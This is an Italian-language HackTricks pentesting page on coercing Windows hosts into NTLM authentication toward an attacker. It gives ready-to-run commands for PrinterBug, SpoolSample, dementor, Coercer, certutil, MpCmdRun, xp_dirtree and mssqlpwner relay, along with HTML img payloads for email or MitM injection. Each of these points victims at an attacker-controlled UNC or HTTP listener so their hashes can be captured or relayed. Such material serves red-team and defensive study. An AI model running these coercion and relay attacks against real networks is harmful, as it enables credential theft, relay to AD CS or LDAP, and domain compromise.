# Forzare l'autenticazione privilegiata NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) è una **raccolta** di **remote authentication triggers** codati in C# usando il compilatore MIDL per evitare dipendenze di terze parti.

## Abuso del servizio Spooler

Se il servizio _**Print Spooler**_ è **abilitato,** puoi usare alcune credenziali AD già note per **richiedere** al print server del Domain Controller un **aggiornamento** sui nuovi print job e dirgli semplicemente di **inviare la notifica a un determinato sistema**.\
Quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi con** quel **sistema**. Pertanto, un attacker può fare in modo che il servizio _**Print Spooler**_ esegua l'autenticazione verso un sistema arbitrario e il servizio **utilizzerà l'account del computer** per questa autenticazione.

Internamente, la primitiva classica **PrinterBug** abusa di **`RpcRemoteFindFirstPrinterChangeNotificationEx`** su **`\\PIPE\\spoolss`**. L'attacker apre prima un handle verso una stampante/server e poi fornisce un nome client falso in `pszLocalMachine`, in modo che lo spooler target crei un canale di notifica **verso l'host controllato dall'attacker**. Per questo l'effetto è una **coercizione dell'autenticazione in uscita** anziché un'esecuzione diretta di codice.<sup>[[2]](#references)</sup>\
Se stai cercando **RCE/LPE** nello spooler stesso, consulta [PrintNightmare](printnightmare.md). Questa pagina è incentrata su **coercion e relay**.

### Individuazione dei Windows server nel dominio

Usa PowerShell per elencare gli host Windows. I server sono solitamente i target con la priorità più alta, quindi concentrati prima su di essi:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Ricerca dei servizi Spooler in ascolto

Utilizzando una versione leggermente modificata di [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) di @mysmartlogin (Vincent Le Toux), verifica se il servizio Spooler è in ascolto:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Puoi anche usare `rpcdump.py` su Linux e cercare il protocollo **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Oppure testa rapidamente gli host da Linux con **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Se vuoi **enumerare le superfici di coercion** invece di limitarti a verificare se l'endpoint dello spooler esiste, usa la **modalità di scansione di Coercer**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Questo è utile perché vedere l'endpoint in EPM ti indica soltanto che l'interfaccia RPC di stampa è registrata. **Non** garantisce che ogni metodo di coercion sia raggiungibile con i privilegi attuali o che l'host generi un flusso di autenticazione utilizzabile.

### Chiedere al servizio di autenticarsi verso un host arbitrario

Puoi compilare [SpoolSample da qui](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oppure usa [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se sei su Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Con **Coercer**, puoi prendere direttamente di mira le interfacce dello spooler ed evitare di dover indovinare quale metodo RPC sia esposto:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Forzare HTTP invece di SMB con WebClient

Il classico PrinterBug di solito produce un'autenticazione **SMB** verso `\\attacker\share`, che è ancora utile per il **capture**, il **relay verso target HTTP** o il **relay quando la firma SMB è assente**.\
Tuttavia, negli ambienti moderni, il **relay da SMB a SMB** è spesso bloccato dalla **firma SMB**, quindi gli operatori preferiscono spesso forzare l'autenticazione **HTTP/WebDAV**.

Se il target ha il servizio **WebClient** in esecuzione, il listener può essere specificato in una forma che induce Windows a usare **WebDAV su HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Questo è particolarmente utile quando si concatena con **`ntlmrelayx --adcs`** o con altri target HTTP relay, perché evita di dover fare affidamento sulla possibilità di eseguire SMB relay sulla connessione indotta. L'avvertenza importante è che **WebClient deve essere in esecuzione** sulla vittima affinché la variante HTTP/WebDAV funzioni.

### Combinazione con Unconstrained Delegation

Se un attaccante ha compromesso un computer configurato per [Unconstrained Delegation](unconstrained-delegation.md), può **indurre la stampante ad autenticarsi verso quel computer**. Il **TGT** dell'account computer della stampante viene quindi memorizzato nella memoria dell'host con unconstrained delegation, dove l'attaccante può recuperarlo e riutilizzarlo con [Pass the Ticket](pass-the-ticket.md).

## Autenticazione forzata tramite RPC

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Matrice di coercion RPC tramite percorso UNC (interfacce/opnum che attivano l'autenticazione in uscita)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnum: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tool: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Note: interfaccia di stampa asincrona sulla stessa pipe dello spooler; usare Coercer per enumerare i metodi raggiungibili su un determinato host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipe: \\PIPE\\efsrpc (anche tramite \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUID: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnum comunemente abusati: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnum: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnum: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Nota: questi metodi accettano parametri che possono contenere un percorso UNC (ad esempio, `\\attacker\share`). Durante l'elaborazione, Windows esegue l'autenticazione (nel contesto del computer o dell'utente) verso tale UNC, consentendo la cattura o il relay di NetNTLM.\
Per l'abuso dello spooler, **MS-RPRN opnum 65** rimane la primitiva più comune e meglio documentata, perché la specifica del protocollo afferma esplicitamente che il server crea un canale di notifica verso il client specificato da `pszLocalMachine`.<sup>[[2]](#references)</sup>

### Coercion MS-EVEN: ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effetto: il target tenta di aprire il percorso del log di backup fornito ed esegue l'autenticazione verso l'UNC controllato dall'attaccante.<sup>[[1]](#references)</sup>
- Uso pratico: indurre asset Tier 0 (DC/RODC/Citrix/ecc.) a emettere NetNTLM, quindi eseguire il relay verso endpoint AD CS (scenari ESC8/ESC11) o altri servizi privilegiati.<sup>[[1]](#references)</sup>

## PrivExchange

L'attacco `PrivExchange` è il risultato di una vulnerabilità presente nella **feature `PushSubscription` di Exchange Server**. Questa feature consente di forzare il server Exchange, da parte di qualsiasi utente di dominio dotato di mailbox, ad autenticarsi verso un host fornito dal client tramite HTTP.

Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e dispone di privilegi eccessivi (in particolare, di **WriteDacl sul dominio prima del Cumulative Update 2019**). Questa vulnerabilità può essere sfruttata per abilitare il **relay delle informazioni verso LDAP e successivamente estrarre il database NTDS del dominio**. Nei casi in cui il relay verso LDAP non sia possibile, la vulnerabilità può comunque essere utilizzata per eseguire il relay e autenticarsi verso altri host all'interno del dominio. Lo sfruttamento riuscito di questo attacco garantisce accesso immediato a Domain Admin con qualsiasi account utente di dominio autenticato.

## All'interno di Windows

Se ci si trova già all'interno della macchina Windows, è possibile forzare Windows a connettersi a un server utilizzando account privilegiati con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Oppure usa quest'altra tecnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

È possibile usare il lolbin certutil.exe (binary firmato da Microsoft) per forzare l'autenticazione NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Tramite email

Se conosci l'**email address** dell'utente che effettua il **log in** su una macchina che vuoi compromettere, potresti semplicemente inviargli un'**email con un'immagine 1x1** come ad esempio
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Quando la vittima lo apre, Windows tenta di autenticarsi.

### MitM

Se puoi eseguire un attacco MitM e iniettare HTML in una pagina visualizzata dalla vittima, prova a iniettare un'immagine come:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Altri modi per forzare e fare phishing per l'autenticazione NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Se riesci a catturare [challenge NTLMv1, leggi qui come crackarli](../ntlm/index.html#ntlmv1-attack).\
_Ricorda che per crackare NTLMv1 devi impostare la challenge di Responder su "1122334455667788"_

## References

- [1] [Unit 42 – La coercizione dell'autenticazione continua a evolversi](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Protocollo EventLog Remoting](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – metodi di autenticazione Windows indotti](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
